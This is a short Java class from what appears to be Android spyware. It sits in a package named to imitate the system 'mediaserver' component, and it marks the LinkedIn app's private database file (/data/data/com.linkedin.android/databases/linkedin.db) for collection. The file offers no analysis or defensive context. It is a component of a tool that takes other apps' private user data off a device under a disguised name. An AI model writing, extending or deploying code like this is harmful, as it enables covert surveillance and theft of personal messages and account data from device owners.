package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class LinkedInFetcher extends FileFetcher {
  public LinkedInFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.linkedin.android/databases/linkedin.db"), "APP",
            "linkedin"));
  }
}
